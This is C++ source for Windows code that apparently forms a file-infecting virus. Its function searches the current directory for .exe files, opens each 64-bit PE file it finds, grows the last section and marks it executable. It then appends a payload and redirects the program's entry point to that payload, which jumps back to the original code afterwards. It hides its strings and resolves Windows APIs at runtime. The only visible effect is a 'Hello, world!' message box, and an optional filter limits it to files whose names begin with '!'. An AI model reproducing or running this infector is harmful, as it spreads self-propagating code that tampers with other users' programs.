#include "payload.h"
#include <Windows.h>
#include "libproc.hpp"
#include "utils.h"

EXTERN_C_START
extern CONST VOID payload();
extern CONST LONGLONG delta_start;
extern CONST DWORD code_size;
EXTERN_C_END

__declspec(code_seg("injected")) VOID inj_code_c() {
    DECLARE_OBFUSCATED(user32, "USER32.DLL");
    DECLARE_OBFUSCATED(mbTitle, "Hello");
    DECLARE_OBFUSCATED(mbText, "Hello, world!");
    DECLARE_OBFUSCATED(exeExt, "*.exe");
#ifdef PL_DEBUG
    DECLARE_OBFUSCATED(mbInjecting, "Injecting payload...");
    // DECLARE_OBFUSCATED(errGetModName, "Error getting module name");
    // DECLARE_OBFUSCATED(errGetDir, "Error getting current directory");
    DECLARE_OBFUSCATED(errFindFile, "Error finding .exe files");
    // DECLARE_OBFUSCATED(errOpenFile, "Error opening file");
    // DECLARE_OBFUSCATED(errMapFile, "Error mapping file");
    DECLARE_OBFUSCATED(errNotPE, "Not a PE x64 file");
#endif

    CONST auto pKernel32Dll = GET_DLL(kernel32.dll);
    CONST auto pLoadLibraryA = GET_FUNC(pKernel32Dll, LoadLibraryA);
    CONST auto pGetModuleFileNameA = GET_FUNC(pKernel32Dll, GetModuleFileNameA);
    CONST auto pCreateFileA = GET_FUNC(pKernel32Dll, CreateFileA);
    CONST auto pGetFileSize = GET_FUNC(pKernel32Dll, GetFileSize);
    CONST auto pCreateFileMappingA = GET_FUNC(pKernel32Dll, CreateFileMappingA);
    CONST auto pMapViewOfFile = GET_FUNC(pKernel32Dll, MapViewOfFile);
    CONST auto pFlushViewOfFile = GET_FUNC(pKernel32Dll, FlushViewOfFile);
    CONST auto pUnmapViewOfFile = GET_FUNC(pKernel32Dll, UnmapViewOfFile);
    CONST auto pCloseHandle = GET_FUNC(pKernel32Dll, CloseHandle);
    CONST auto pGetCurrentDirectoryA = GET_FUNC(pKernel32Dll, GetCurrentDirectoryA);
    CONST auto pFindFirstFileA = GET_FUNC(pKernel32Dll, FindFirstFileA);
    CONST auto pFindNextFileA = GET_FUNC(pKernel32Dll, FindNextFileA);
    CONST auto pFindClose = GET_FUNC(pKernel32Dll, FindClose);

    CONST auto pUser32Dll = pLoadLibraryA(DEOBF(user32));
    CONST auto pMessageBoxA = GET_FUNC(pUser32Dll, MessageBoxA);

    CHAR sModuleName[MAX_PATH];
    DWORD res = pGetModuleFileNameA(NULL, sModuleName, sizeof(sModuleName));
    if (res == 0 || res >= sizeof(sModuleName)) {
        // MSGBOX_DBG(DEOBF(errGetModName), NULL, MB_OK | MB_ICONERROR);
        return;
    }
    // MSGBOX_DBG(sModuleName, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);

    CHAR sDirName[MAX_PATH];
    CHAR sFindPath[MAX_PATH];
    res = pGetCurrentDirectoryA(sizeof(sDirName), sDirName);
    if (res == 0 || res >= sizeof(sDirName) - DEOBF(exeExt).length - 1) {
        // MSGBOX_DBG(DEOBF(errGetDir), NULL, MB_OK | MB_ICONERROR);
        return;
    }
    my_strappend(sDirName, '\\');
    my_strcpy(sFindPath, sDirName);
    my_strcat(sFindPath, DEOBF(exeExt));
    // MSGBOX_DBG(sFindPath, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);

    CHAR sFilePath[MAX_PATH];
    LPSTR sDirEnd = my_strcpy(sFilePath, sDirName) - 1;

    WIN32_FIND_DATAA findData;
    HANDLE hFind = pFindFirstFileA(sFindPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        MSGBOX_DBG(DEOBF(errFindFile), NULL, MB_OK | MB_ICONERROR);
        return;
    }

    HANDLE hFile, hMapFile;
    LPVOID pMapAddress;
    DWORD dwFileSize;
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS64 pNtHeader;
    PIMAGE_SECTION_HEADER pSection, pLastSection;
    DWORD dwPayloadPtr, dwOrigEntryPoint, dwNewEntryPoint;

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }

        my_strcpy(sDirEnd, findData.cFileName);
        if (!my_stricmp(sFilePath, sModuleName)
#ifdef NEED_BANG
            || sDirEnd[0] != '!'
#endif
        ) {
            MSGBOX_DBG(sFilePath, DEOBF(mbInjecting), MB_OK | MB_ICONWARNING);
            continue;
        }
        MSGBOX_DBG(sFilePath, DEOBF(mbInjecting), MB_OK | MB_ICONINFORMATION);

        hFile = pCreateFileA(sFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                             FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            // MSGBOX_DBG(DEOBF(errOpenFile), NULL, MB_OK | MB_ICONERROR);
            continue;
        }

        dwFileSize = pGetFileSize(hFile, NULL);

        hMapFile =
            pCreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, dwFileSize + code_size, NULL);
        if (hMapFile == NULL) {
            // MSGBOX_DBG(DEOBF(errMapFile), NULL, MB_OK | MB_ICONERROR);
            goto close_file;
        }

        pMapAddress = pMapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
        if (pMapAddress == NULL) {
            // MSGBOX_DBG(DEOBF(errMapFile), NULL, MB_OK | MB_ICONERROR);
            goto close_map;
        }

        pDosHeader = (PIMAGE_DOS_HEADER)pMapAddress;
        pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE ||
            pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
            pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
            pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            MSGBOX_DBG(DEOBF(errNotPE), NULL, MB_OK | MB_ICONERROR);
            goto unmap;
        }

        pSection = IMAGE_FIRST_SECTION(pNtHeader);
        pLastSection = &pSection[pNtHeader->FileHeader.NumberOfSections - 1];
        dwPayloadPtr = pLastSection->PointerToRawData + pLastSection->SizeOfRawData;
        dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
        dwNewEntryPoint = pLastSection->VirtualAddress + pLastSection->SizeOfRawData;

        pLastSection->Misc.VirtualSize += code_size;
        pLastSection->SizeOfRawData += code_size;
        pNtHeader->OptionalHeader.SizeOfCode += code_size;
        pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE;
        pNtHeader->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;

        my_memcpy((PBYTE)pMapAddress + dwPayloadPtr, (PCBYTE)payload, code_size);
        *(PLONGLONG)((PCBYTE)pMapAddress + dwPayloadPtr +
                     ((PCBYTE)&delta_start - (PCBYTE)&payload)) =
            (LONGLONG)dwOrigEntryPoint - (LONGLONG)dwNewEntryPoint;

        pFlushViewOfFile(pMapAddress, 0);
    unmap:
        pUnmapViewOfFile(pMapAddress);
    close_map:
        pCloseHandle(hMapFile);
    close_file:
        pCloseHandle(hFile);
    } while (pFindNextFileA(hFind, &findData));

    pFindClose(hFind);

    pMessageBoxA(NULL, DEOBF(mbText), DEOBF(mbTitle), MB_OKCANCEL | MB_ICONINFORMATION);
}
